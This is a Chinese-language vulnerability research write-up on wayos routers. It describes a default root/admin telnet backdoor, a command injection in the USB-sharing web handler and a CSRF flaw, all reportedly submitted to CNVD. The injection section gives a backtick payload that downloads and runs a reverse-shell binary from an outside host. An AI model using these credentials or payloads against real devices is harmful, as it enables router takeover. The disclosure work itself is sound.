# wayos维盟路由器漏洞挖掘

## 漏洞影响

WAM_9900等多款WAM系列路由器、网关（带有USB共享功能），包括但不限于WAM系列，FBM系列，HDV系列，HZV系列，IBR系列，JMV系列，LQ系列，SDV系列，WAP系列，WS系列，21.10.09之前固件

## 文件系统分析

使用binwalk解包，查看路由器启动文件，会自启动telnet，如果能拿到账号密码，就直接getshell了，后边再分析

![image-20220418220604813](wayos维盟多款路由器命令注入.assets/image-20220418220604813.png)

接下来查看后端的web服务器，这里先根据二进制文件名查找，定位到/usr/sbin/jhttpd

```
find ./ -name "*http*"
```

![image-20220418221529716](wayos维盟多款路由器命令注入.assets/image-20220418221529716.png)



## 漏洞挖掘

### 预置后门漏洞

使用FirmAE工具仿真固件，运行成功后使用nmap扫描端口，发现开放了telnet端口

![image-20220418222233009](wayos维盟多款路由器命令注入.assets/image-20220418222233009.png)

访问连接一下，查找关键字

![image-20220418222514924](wayos维盟多款路由器命令注入.assets/image-20220418222514924.png)

```
grep -r "telnet"     grep -r "WayOS"
```

![image-20220418223028069](wayos维盟多款路由器命令注入.assets/image-20220418223028069.png)

![image-20220418223819380](wayos维盟多款路由器命令注入.assets/image-20220418223819380.png)

![image-20220418233946970](wayos维盟多款路由器命令注入.assets/image-20220418233946970.png)

使用root/admin可以成功登录telnet

![image-20220419002856073](wayos维盟多款路由器命令注入.assets/image-20220419002856073.png)

这个漏洞不是影响所有的设备，部分网关设备telnet服务不会随系统启动开启

### 命令注入漏洞

推荐一个插件，https://github.com/firmianay/firmeye，firmeye 是一个 IDA 插件，基于敏感函数参数回溯来辅助漏洞挖掘。我们知道，在固件漏洞挖掘中，从敏感/危险函数出发，寻找其参数来源，是一种很有效的漏洞挖掘方法，但程序中调用敏感函数的地方非常多，人工分析耗时费力，通过该插件，可以帮助排除大部分的安全调用，从而提高效率。

![image-20220420233552842](wayos维盟多款路由器命令注入.assets/image-20220420233552842.png)

![image-20220420233625070](wayos维盟多款路由器命令注入.assets/image-20220420233625070.png)

在文件jhttd，其他系列固件中也命名为jhttd_s，

从get请求中获取usb_username和use_husername没有进行完全过滤，拼接的命令直接作为system()参数执行，引发命令注入

![image-20220420233851094](wayos维盟多款路由器命令注入.assets/image-20220420233851094.png)

使用默认web口令，root/admin登录管理页面，打开usb存储共享服务，提交

![img](wayos维盟多款路由器命令注入.assets/wps4C31.tmp.jpg)

使用burp修改name或者hname参数为

```
`wget http://192.168.1.2:8000 -O /tmp/re;chmod 777 /tmp/re;/tmp/re 192.168.1.2 5555`
```

将payload进行url编码，本地开启一个http服务，放置编译好的反弹shell，监听5555端口

![img](wayos维盟多款路由器命令注入.assets/wpsA1FF.tmp.jpg)



![image-20220420234450539](wayos维盟多款路由器命令注入.assets/image-20220420234450539.png)

这个漏洞影响所有带有USB共享功能的路由网关设备，最新固件和历史固件都受影响

### CSRF

IDA分析jhttpd，搜索字符串usb，有一些关于USB共享功能的url，其中usb_upload.htm是无需经过身份验证的，

![image-20220421001024099](wayos维盟多款路由器命令注入.assets/image-20220421001024099.png)

![img](wayos维盟多款路由器命令注入.assets/wpsEFEB.tmp.jpg)

未经身份验证，删除文件会失败，抓包生成CSRF Poc，使用认证过的浏览器打开，点击提交，会成功删除文件。

![img](wayos维盟多款路由器命令注入.assets/wps779B.tmp.jpg)



这个漏洞影响所有带有USB共享功能的路由网关设备，最新固件和历史固件都受影响

## 总结

总的来说挖到这几个漏洞都不是很难，需要扩展一下自己的思路和实际上手能力，以上三个漏洞均已提交CNVD。